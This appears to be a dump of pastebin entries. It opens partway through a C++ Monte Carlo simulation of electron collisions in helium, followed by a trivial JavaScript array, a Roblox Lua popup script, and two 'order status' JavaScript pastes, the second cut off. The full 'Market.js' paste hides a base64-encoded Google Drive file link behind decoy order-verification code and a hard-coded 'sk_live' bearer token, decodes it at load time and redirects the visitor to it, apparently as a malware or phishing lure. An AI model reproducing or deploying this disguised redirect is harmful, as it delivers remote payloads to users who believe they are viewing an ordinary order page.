            int j = i + std::uniform_int_distribution<int>(0, n_e - i - 1)(gen);
            std::swap(electron_indices[i], electron_indices[j]);
        }

        int exc1_coll_counter_temp = 0;
        int super1_coll_counter_temp = 0;
        int exc2_coll_counter_temp = 0;
        int super2_coll_counter_temp = 0;
        int null_coll_counter_temp = 0;

        double energy_exc = 0.0; // calculating excitation losses each timestep
        double energy_sup = 0.0; // calculating superelastic gains each timestep
        double energy_Efield = 0.0; // calculating field gains/losses each timestep


        // std::cout << ""Progress: "" << (t_elapsed/total_time)*100 << ""\n"";

        // setting flags to false each timestep
        for (auto& e : electrons) e.collided_en = false;
        for (auto& e : electrons) e.collided_ee = false;        

        int collision_counter_en = 0; // electron-neutral collision counter
        int collision_counter_ee = 0; // e-e collisoin counter

        /// -- electrin field heating along E-Z axis begin--- /// -- first half!!!
        for (int idx : electron_indices) {
            double half_dt = dt/2.0;
            energy_Efield += ( C1*electrons[idx].vz*half_dt + C2*half_dt*half_dt )/q; // dividing by q to get eV             
            // Update velocity component due to electric field
            // double a_z = ((-1.0)*q * E_reduced) / m_e; // acceleration in z-direction, m/s^2
            electrons[idx].vz += a_z * (dt*0.5); // only half timestep

            // Recalculate energy from updated velocity
            double vx = electrons[idx].vx;
            double vy = electrons[idx].vy;
            double vz = electrons[idx].vz;
            electrons[idx].energy = (vx*vx + vy*vy + vz*vz)*charge_mass_ratio;
        }
        // -------------------------------------------- filed heating ends ------------------------//   


        for (int idx : electron_indices) {

            if (collision_counter_en >= Ne_collided) break; // quit if reached all collisions

            Electron& e = electrons[idx];
            if (e.collided_en) continue;  // Skip already collided electrons

            double dens_neutrals = (N_He/Volume);
            double dens_exc_1 = (exc_1.size()/Volume);
            double dens_exc_2 = (exc_2.size()/Volume);
            double speed = sqrt_charge_mass*sqrt(e.energy);

            int bin_energy = static_cast<int>(e.energy / bin_width);
            double nu_elastic = dens_neutrals * elastic_vec[bin_energy] * speed;
            double nu_inelastic1 = dens_neutrals * inelastic1_vec[bin_energy] * speed;
            double nu_superelastic1 = dens_exc_1 * superelastic1_vec[bin_energy] * speed;
            double nu_inelastic2 = dens_neutrals * inelastic2_vec[bin_energy] * speed;
            double nu_superelastic2 = dens_exc_2 * superelastic2_vec[bin_energy] * speed;

            double r = dis(gen);

            double P0 = nu_elastic/nu_max;
            double P1 = (nu_elastic + nu_inelastic1)/nu_max;
            double P2 = (nu_elastic + nu_inelastic1 + nu_superelastic1)/nu_max;
            double P3 = (nu_elastic + nu_inelastic1 + nu_superelastic1 + nu_inelastic2)/nu_max;
            double P4 = (nu_elastic + nu_inelastic1 + nu_superelastic1 + nu_inelastic2 + nu_superelastic2)/nu_max;            

            if (r < P0) {
 
                // elastic collision happens
 
                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;
                
                // neutral that collides with electron

                // randomize particles each collision

                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V_x_n = tmp_neutral.vx;
                double V_y_n = tmp_neutral.vy;
                double V_z_n = tmp_neutral.vz;
                double E_n = tmp_neutral.energy;

 
                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);

                // initial relative velocity
                double V_rel_x = V0_x - V_x_n;
                double V_rel_y = V0_y - V_y_n;
                double V_rel_z = V0_z - V_z_n;

                double V_rel = sqrt(V_rel_x*V_rel_x + V_rel_y*V_rel_y + V_rel_z*V_rel_z);
                if (std::isnan(V_rel) || std::isinf(V_rel) || fabs(V_rel) < 1e-12) {
                    std::cerr << ""Invalid V_rel copmuted: "" << V_rel << "" at timestep "" << t_elapsed << std::endl;
                }
                //initial relative velocity unit vectors components
                double e1 = V_rel_x/V_rel;
                double e2 = V_rel_y/V_rel;
                double e3 = V_rel_z/V_rel;

                double C = -V_rel/(1.0+(m_e/M_n));
                double beta = sqrt(1.0 - thresh0/e.energy);
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = 1.0 - 2.0*R1;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
                if (std::isnan(sin_khi) || std::isinf(sin_khi)) {
                    std::cerr << ""Invalid sin_khi copmuted: "" << sin_khi << "" at timestep "" << t_elapsed << std::endl;
                }                
 
                double phi = 2.0*M_PI*R2;

                //calculating velocity change of electron

                double dv_x = C*( (1.0-beta*cos_khi)*e1 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(-e2) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(-e1*e3)  );
                double dv_y = C*( (1.0-beta*cos_khi)*e2 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(e1) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(-e2*e3)  );
                double dv_z = C*( (1.0-beta*cos_khi)*e3 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(0.0) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(e1*e1 + e2*e2)  );

                //updating electron energy and velocities   
 
                //updating electron energy and velocities
                
                e.vx += dv_x;
                e.vy += dv_y;
                e.vz += dv_z;

                e.energy = (e.vx*e.vx + e.vy*e.vy + e.vz*e.vz) * charge_mass_ratio;
 
                collision_counter_en++;
                el_coll_counter++;
 
                e.collided_en = true;
            }      

            else if (r < P1) {

                //inelastic 1(triplet) collision happens

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;
                
                // neutral that collides with electron

                // randomize particles each collision

                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V_x_n = tmp_neutral.vx;
                double V_y_n = tmp_neutral.vy;
                double V_z_n = tmp_neutral.vz;
                double E_n = tmp_neutral.energy;

 
                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);

                // initial relative velocity
                double V_rel_x = V0_x - V_x_n;
                double V_rel_y = V0_y - V_y_n;
                double V_rel_z = V0_z - V_z_n;

                double V_rel = sqrt(V_rel_x*V_rel_x + V_rel_y*V_rel_y + V_rel_z*V_rel_z);
                
                if (std::isnan(V_rel) || std::isinf(V_rel) || fabs(V_rel) < 1e-12) {
                    std::cerr << ""Invalid V_rel copmuted: "" << V_rel << "" at timestep "" << t_elapsed << std::endl;
                }

                //initial relative velocity unit vectors components
                double e1 = V_rel_x/V_rel;
                double e2 = V_rel_y/V_rel;
                double e3 = V_rel_z/V_rel;

                double C = -V_rel/(1.0+(m_e/M_n));
                double beta = sqrt(abs(1.0 - thresh1/e.energy));
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = 1.0 - 2.0*R1;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
                if (std::isnan(sin_khi) || std::isinf(sin_khi)) {
                    std::cerr << ""Invalid sin_khi copmuted: "" << sin_khi << "" at timestep "" << t_elapsed << std::endl;
                }      
                double phi = 2.0*M_PI*R2;

                //calculating velocity change of electron

                double dv_x = C*( (1.0-beta*cos_khi)*e1 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(-e2) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(-e1*e3)  );
                double dv_y = C*( (1.0-beta*cos_khi)*e2 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(e1) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(-e2*e3)  );
                double dv_z = C*( (1.0-beta*cos_khi)*e3 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(0.0) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(e1*e1 + e2*e2)  );

                //updating electron energy and velocities         
                
                if (e.energy < thresh1) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;
                }
                else {
                    e.vx += dv_x;
                    e.vy += dv_y;
                    e.vz += dv_z;

                    e.energy = (e.vx*e.vx + e.vy*e.vy + e.vz*e.vz) * charge_mass_ratio;
 
                    collision_counter_en++;   
                    exc1_coll_counter++;
                    exc1_coll_counter_temp++;
 
                    e.collided_en = true;

                    // pushing this neutral to an array of excited species exc_1
                    if (N_He > 0) {
                        exc_1.push_back({E_n, V_x_n, V_y_n, V_z_n});
                        N_He--;
                    }
                }
            }     

            else if (r < P2) {

                //superelastic 1(triplet -> ground state) collision happens

                if (exc_1.empty()) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;            
                }

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;

                // neutral that collides with electron
                // taking particles from dynamic array of excited neutrals

                int index = std::uniform_int_distribution<int>(0, exc_1.size()-1)(gen);
                Excited_neutral& exc = exc_1[index];
                double V_x_n = exc.vx;
                double V_y_n = exc.vy;
                double V_z_n = exc.vz;
                double E_n = exc.energy;
                
                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);

                // initial relative velocity
                double V_rel_x = V0_x - V_x_n;
                double V_rel_y = V0_y - V_y_n;
                double V_rel_z = V0_z - V_z_n;

                double V_rel = sqrt(V_rel_x*V_rel_x + V_rel_y*V_rel_y + V_rel_z*V_rel_z);

                if (std::isnan(V_rel) || std::isinf(V_rel) || fabs(V_rel) < 1e-12) {
                    std::cerr << ""Invalid V_rel copmuted: "" << V_rel << "" at timestep "" << t_elapsed << std::endl;
                }

                //initial relative velocity unit vectors components
                double e1 = V_rel_x/V_rel;
                double e2 = V_rel_y/V_rel;
                double e3 = V_rel_z/V_rel;

                double C = -V_rel/(1.0+(m_e/M_n));
                double beta = sqrt(1.0 + thresh1/e.energy);
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = 1.0 - 2.0*R1;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
                if (std::isnan(sin_khi) || std::isinf(sin_khi)) {
                    std::cerr << ""Invalid sin_khi copmuted: "" << sin_khi << "" at timestep "" << t_elapsed << std::endl;
                }      
                double phi = 2.0*M_PI*R2;

                //calculating velocity change of electron

                double dv_x = C*( (1.0-beta*cos_khi)*e1 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(-e2) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(-e1*e3)  );
                double dv_y = C*( (1.0-beta*cos_khi)*e2 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(e1) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(-e2*e3)  );
                double dv_z = C*( (1.0-beta*cos_khi)*e3 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(0.0) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(e1*e1 + e2*e2)  );
 
                //updating electron energy and velocities         
                
                e.vx += dv_x;
                e.vy += dv_y;
                e.vz += dv_z;

                e.energy = (e.vx*e.vx + e.vy*e.vy + e.vz*e.vz) * charge_mass_ratio;

                //counting collisions, working with flags, popping atom out of the vector
                if (!exc_1.empty()) {
                    std::swap(exc_1[index], exc_1.back());
                    exc_1.pop_back();
                    N_He++;
                }
                collision_counter_en++;   
                super1_coll_counter++;
                super1_coll_counter_temp++;
                energy_sup += thresh1;

                e.collided_en = true;
            }  

            else if (r < P3) {

                //inelastic 1(singlet) excitation collision happens

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;
                
                // neutral that collides with electron

                // randomize particles each collision

                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V_x_n = tmp_neutral.vx;
                double V_y_n = tmp_neutral.vy;
                double V_z_n = tmp_neutral.vz;
                double E_n = tmp_neutral.energy;

 
                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);

                // initial relative velocity
                double V_rel_x = V0_x - V_x_n;
                double V_rel_y = V0_y - V_y_n;
                double V_rel_z = V0_z - V_z_n;

                double V_rel = sqrt(V_rel_x*V_rel_x + V_rel_y*V_rel_y + V_rel_z*V_rel_z);

                if (std::isnan(V_rel) || std::isinf(V_rel) || fabs(V_rel) < 1e-12) {
                    std::cerr << ""Invalid V_rel copmuted: "" << V_rel << "" at timestep "" << t_elapsed << std::endl;
                }

                //initial relative velocity unit vectors components
                double e1 = V_rel_x/V_rel;
                double e2 = V_rel_y/V_rel;
                double e3 = V_rel_z/V_rel;

                double C = -V_rel/(1.0+(m_e/M_n));
                double beta = sqrt(abs(1.0 - thresh2/e.energy));
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = 1.0 - 2.0*R1;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
                if (std::isnan(sin_khi) || std::isinf(sin_khi)) {
                    std::cerr << ""Invalid sin_khi copmuted: "" << sin_khi << "" at timestep "" << t_elapsed << std::endl;
                }      
                double phi = 2.0*M_PI*R2;

                //calculating velocity change of electron

                double dv_x = C*( (1.0-beta*cos_khi)*e1 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(-e2) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(-e1*e3)  );
                double dv_y = C*( (1.0-beta*cos_khi)*e2 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(e1) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(-e2*e3)  );
                double dv_z = C*( (1.0-beta*cos_khi)*e3 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(0.0) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(e1*e1 + e2*e2)  );

                //updating electron energy and velocities         
                
                if (e.energy < thresh1) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;
                }
                else {
                    e.vx += dv_x;
                    e.vy += dv_y;
                    e.vz += dv_z;

                    e.energy = (e.vx*e.vx + e.vy*e.vy + e.vz*e.vz) * charge_mass_ratio;
 
                    collision_counter_en++;   
                    exc2_coll_counter++;
                    exc2_coll_counter_temp++;
 
                    e.collided_en = true;

                    // pushing this neutral to an array of excited species exc_2

                    if (N_He > 0) {
                        exc_2.push_back({E_n, V_x_n, V_y_n, V_z_n});
                        N_He--;
                    }
                }
            }

            else if (r < P4) {

                //supernelastic 1(singlet -> ground state) collision happens

                if (exc_2.empty()) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;            
                }

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;

                // neutral that collides with electron
                // taking particles from dynamic array of excited neutrals

                int index = std::uniform_int_distribution<int>(0, exc_2.size()-1)(gen);
                Excited_neutral& exc = exc_2[index];
                double V_x_n = exc.vx;
                double V_y_n = exc.vy;
                double V_z_n = exc.vz;
                double E_n = exc.energy;
                
                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);

                // initial relative velocity
                double V_rel_x = V0_x - V_x_n;
                double V_rel_y = V0_y - V_y_n;
                double V_rel_z = V0_z - V_z_n;

                double V_rel = sqrt(V_rel_x*V_rel_x + V_rel_y*V_rel_y + V_rel_z*V_rel_z);

                if (std::isnan(V_rel) || std::isinf(V_rel) || fabs(V_rel) < 1e-12) {
                    std::cerr << ""Invalid V_rel copmuted: "" << V_rel << "" at timestep "" << t_elapsed << std::endl;
                }

                //initial relative velocity unit vectors components
                double e1 = V_rel_x/V_rel;
                double e2 = V_rel_y/V_rel;
                double e3 = V_rel_z/V_rel;

                double C = -V_rel/(1.0+(m_e/M_n));
                double beta = sqrt(1.0 + thresh2/e.energy);
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = 1.0 - 2.0*R1;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
                if (std::isnan(sin_khi) || std::isinf(sin_khi)) {
                    std::cerr << ""Invalid sin_khi copmuted: "" << sin_khi << "" at timestep "" << t_elapsed << std::endl;
                }      
                double phi = 2.0*M_PI*R2;

                //calculating velocity change of electron

                double dv_x = C*( (1.0-beta*cos_khi)*e1 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(-e2) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(-e1*e3)  );
                double dv_y = C*( (1.0-beta*cos_khi)*e2 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(e1) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(-e2*e3)  );
                double dv_z = C*( (1.0-beta*cos_khi)*e3 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(0.0) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(e1*e1 + e2*e2)  );
 
                //updating electron energy and velocities         
                
                e.vx += dv_x;
                e.vy += dv_y;
                e.vz += dv_z;

                e.energy = (e.vx*e.vx + e.vy*e.vy + e.vz*e.vz) * charge_mass_ratio;
                //counting collisions, working with flags, popping atom out of the vector

                if (!exc_2.empty()) {
                    std::swap(exc_2[index], exc_2.back());
                    exc_2.pop_back();
                    N_He++;
                }

                collision_counter_en++;   
                super2_coll_counter++;
                super2_coll_counter_temp++;
                energy_sup += thresh2;

                e.collided_en = true;
            }              

            else {
                // null-collision
                collision_counter_en++;
                null_coll_counter++;
                e.collided_en = true;
            }
        }


        /// -- electrin field heating along E-Z axis begin--- /// -- second half!!!
        for (int idx : electron_indices) {
            double half_dt = dt/2.0;
            energy_Efield += ( C1*electrons[idx].vz*half_dt + C2*half_dt*half_dt )/q; //dividing by q to get eV
            // Update velocity component due to electric field
            // double a_z = ((-1.0)*q * E_reduced) / m_e; // acceleration in z-direction, m/s^2
            electrons[idx].vz += a_z * (dt*0.5); // only half timestep

            // Recalculate energy from updated velocity
            double vx = electrons[idx].vx;
            double vy = electrons[idx].vy;
            double vz = electrons[idx].vz;
            electrons[idx].energy = (vx*vx + vy*vy + vz*vz) * charge_mass_ratio;
        }
        // -------------------------------------------- filed heating ends ------------------------////////////////

        int decay_counter = 0;

        // // Iterate backwards to safely remove elements
        // for (int i = exc_2.size() - 1; i >= 0; --i) {
        //     if (dis(gen) < dt / tau_singlet) {
        //         // Swap with last element and pop (like your superelastic code)
        //         std::swap(exc_2[i], exc_2.back());
        //         exc_2.pop_back();
        //         N_He++;
        //         decay_counter++;
        //     }
        // }


        t_elapsed += dt; // Advance time
 
        // Recalculate nu_max periodically (e.g., every 100 steps)
        static int recalc_counter = 0;
        if (++recalc_counter >= 1000) {
            
            recalc_counter = 0;
 
            // Recalculate nu_max with CURRENT densities
            nu_max = 0.0;
            for (int i = 0; i < N; i++) {
                double energy = Emin + (i + 0.5) * bin_width;
                
                // Get current densities
                double n_ground = N_He / Volume;
                double n_excited1 = exc_1.size() / Volume;
                double n_excited2 = exc_2.size() / Volume;
                
                // Total collision frequency for this energy bin
                double sigma_total = 
                    elastic_vec[i] * n_ground +
                    inelastic1_vec[i] * n_ground +
                    inelastic2_vec[i] * n_ground +
                    superelastic1_vec[i] * n_excited1 +
                    superelastic2_vec[i] * n_excited2;
 
                double speed = sqrt_charge_mass*sqrt(energy);
                double nu_temp = sigma_total * speed;
                
                if (nu_temp > nu_max) nu_max = nu_temp;
            }

            // Update dt based on new nu_max
            dt = 0.001 / nu_max;        
        }   

        // calculating mean energy 
        if (static_cast<int>(t_elapsed/dt)%print_interval == 0) {
            double total_energy = 0.0;
            for (const auto& e : electrons) total_energy += e.energy;
            double mean_energy = total_energy / n_e;
            file8 << t_elapsed << "" "" << mean_energy << ""\n"";            
            file_temp << t_elapsed << "" "" << exc_1.size() << "" "" << exc_2.size() << ""\n"";
            std::cout << ""Progress: "" << (t_elapsed/total_time)*100 << ""%"" << "" "";
            std::cout << ""   nu_max: "" << nu_max << ""    "" << ""dt: "" << dt << "" "" << ""decay counter: "" << decay_counter <<   ""\n"";
            file16 << t_elapsed << "" "" << energy_Efield/n_e << "" "" << energy_sup/n_e << ""\n"";
        }        

    }

    // ----- final electron energies distribution begins
    for (int i = 0; i < n_e; i++){

        file2 << i << "" "" << electrons[i].energy << ""\n"";

        int bin = static_cast<int>( (electrons[i].energy - Emin)/bin_width_smooth);
        if (bin >=0 && bin < histo_maxwell.size())
            histo_maxwell[bin]++;
    }

    int check = 0;
    for (int i = 0; i < N_smooth; i++){
        check += histo_maxwell[i];
        double bin_center = Emin + (i + 0.5) * bin_width_smooth;
        file4 << bin_center << "" "" <<  static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width_smooth) << ""\n""; // getting f(E)
    }

        std::cout << ""Total # of electrons in a final histogram: "" << check << ""\n"";
        std::cout << ""Final nu max: "" << nu_max << ""\n"";

    // ----- final electron energies distribution ends


    file0.close();
    file1.close();
    file2.close();
    file3.close();
    file4.close();
    file5.close();
    file6.close();
    file7.close();
    file8.close();
    file9.close();
    file10.close();
    file11.close();
    file12.close();
    file13.close();
    file14.close();
    file15.close();
    file_temp.close();
    file16.close();

    clock_t end = clock();

    double elapsed = (double)(end - start) / CLOCKS_PER_SEC;

    // std::cout << ""# of steps: "" << steps << ""\n"";
    // std::cout << ""# of electrons collided each timesteps:"" << Ne_collided << ""\n"";
    
    // std::cout << ""Average elastic collisions per timestep: "" << static_cast<int>(el_coll_counter/steps) << ""\n"";
    // std::cout << ""Average null collisions per timestep: "" << static_cast<int>(null_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";

    // std::cout << ""triplet:________"" << ""\n"";
    // std::cout << ""Average triplet excitation collisions per timestep: "" << static_cast<int>(exc1_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";
    // std::cout << ""Average superelastic triplet collisions per timestep: "" << static_cast<int>(super1_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";

    // std::cout << ""singlet:________"" << ""\n"";
    // std::cout << ""Average singlet excitation collisions per timestep: "" << static_cast<int>(exc2_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";
    // std::cout << ""Average superelastic singlet collisions per timestep: "" << static_cast<int>(super2_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";    

    // std::cout << ""Average e-e collisions per timestep: "" << static_cast<int>(ee_coll_counter/steps) << ""\n"";

    std::cout << ""Elapsed time: %f seconds "" << elapsed << ""\n"";


    return 0;

}"
G9b2R215,js arrays,29JeffGamez,JavaScript,Sunday 20th of April 2025 04:31:34 PM CDT,"const cars = [""Saab"", ""Volvo"", ""BMW""];
// an array"
apQbVYT4,Market.js,hubertzoo90,JavaScript,Sunday 20th of April 2025 04:28:31 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/94911/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4kPxPQ6X,Popup Part w/ Multiple Texts,bookedsam,Lua,Sunday 20th of April 2025 04:18:06 PM CDT,"-- openStudio Popup Parts
-- Local Popup Handler
-- Build 3.5 Multiple Texts 20/4/25

-- // CONFIG

-- ℹ️ℹ️ Watch the tutorial by @bookedsam for help configuring the system. ℹ️ℹ️

local config = { -- Change these settings how you like. Settings are case sensitive.

	-- The name of the theme. Included themes:
	-- ""Classic light"" ""Classic dark"" ""Bubbly"" ""Code"" ""Modern"" ""Transparent""
	[""Theme""] = ""Classic light"",

	-- The type of animation. Included animations:
	-- ""Fade"" ""Typewriter"" ""Bounce""
	[""Animation""] = ""Typewriter"",

	-- Set to false if you want it to only work once.
	[""Repeat""] = true

}

-- ⚠️⚠️ ONLY EDIT BEYOND THIS POINT IF YOU KNOW WHAT YOU ARE DOING ⚠️⚠️

-- // VARIABLES

local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local TweenService = game:GetService(""TweenService"")
local Players = game:GetService(""Players"")

local themes = ReplicatedStorage:WaitForChild(""openPopup"")
local partFolder = workspace:WaitForChild(""openPopup"")

local label = nil
local labelSave = nil
local animations = {}

-- // FUNCTIONS

-- Animation that fades in and out the text.
animations.Fade = function(text: string)

	local info = TweenInfo.new(1)

	local fadeIn = TweenService:Create(label, info, 
		{BackgroundTransparency = labelSave.BackgroundTransparency, 
			TextTransparency = labelSave.TextTransparency})
	local fadeOut = TweenService:Create(label, info, 
		{BackgroundTransparency = 1,
			TextTransparency = 1})

	label.Transparency = 1
	fadeIn:Play()
	fadeIn.Completed:Wait()
	task.wait(string.len(text) / 20)
	fadeOut:Play()
	fadeOut.Completed:Wait()

end

-- Animation that has a typing effect.
animations.Typewriter = function(text: string)

	local infoType = TweenInfo.new(string.len(text) / 10, Enum.EasingStyle.Linear)
	local infoFade = TweenInfo.new(0.5)

	local typeIn = TweenService:Create(label, infoType, {MaxVisibleGraphemes = string.len(text)})

	local fadeIn = TweenService:Create(label, infoFade, {BackgroundTransparency = labelSave.BackgroundTransparency})
	local fadeOut = TweenService:Create(label, infoFade, {BackgroundTransparency = 1, TextTransparency = 1})
	
	label.TextTransparency = 0
	label.MaxVisibleGraphemes = 0
	label.BackgroundTransparency = 1
	fadeIn:Play()
	typeIn:Play()
	typeIn.Completed:Wait()
	task.wait(string.len(text) / 20)
	fadeOut:Play()
	fadeOut.Completed:Wait()

end

-- Animation where the text object jumps into frame.
animations.Bounce = function(text: string)

	local info = TweenInfo.new(0.5, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out)

	local bounceIn = TweenService:Create(label, info, {Size = labelSave.Size})
	local bounceOut = TweenService:Create(label, info, {Size = UDim2.new(0, 0, 0 ,0)})

	label.Size = UDim2.new(0, 0, 0, 0)
	bounceIn:Play()
	bounceIn.Completed:Wait()
	task.wait(string.len(text) / 20)
	bounceOut:Play()
	bounceOut.Completed:Wait()

end

local function setupPart(part)
	if part:IsA(""Part"") then

		for _, e in ipairs(part:GetChildren()) do

			if e:IsA(""Decal"") then e:Destroy() end

		end

		local texts = {}

		for _, v in ipairs(part:GetChildren()) do
			if v:IsA(""StringValue"") then
				texts[tonumber(v.Name)] = v.Value
			end
		end

		local debounce = false

		local connection
		connection = part.Touched:Connect(function(touch)

			if Players:GetPlayerFromCharacter(touch.Parent) == Players.LocalPlayer then

				if debounce then return end
				debounce = true

				for i, v in ipairs(texts) do
					label.Text = v
					label.Visible = true
					animations[config.Animation](v)
				end
				label.Visible = false

				task.wait(1)
				if config.Repeat then debounce = false else connection:Disconnect() end

			end

		end)
	end
end

-- // SETUP

if not animations[config.Animation] then

	warn(""[openPopup] The animation you set could not be found! Defaulting to 'Fade'."")
	config.Animation = ""Fade""

end

if not themes:WaitForChild(config.Theme, 1) then

	warn(""[openPopup] The theme you set could not be found! Defaulting to 'Classic light'"")
	config.Theme = ""Classic light""

end

label = themes:WaitForChild(config.Theme):Clone()
label.Visible = false
label.Parent = script.Parent
labelSave = themes:WaitForChild(config.Theme)

print(""[openPopup] openStudio Popup System ready. Have any errors? Contact @bookedsam."")

-- // MAIN

task.wait(1)

for _, v in ipairs(partFolder:GetChildren()) do
	setupPart(v)
end

partFolder.ChildAdded:Connect(function(part)
	setupPart(part)
end)"
n3b2eSfs,Untitled,hubertzoo90,JavaScript,Sunday 20th of April 2025 04:13:08 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/08590/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
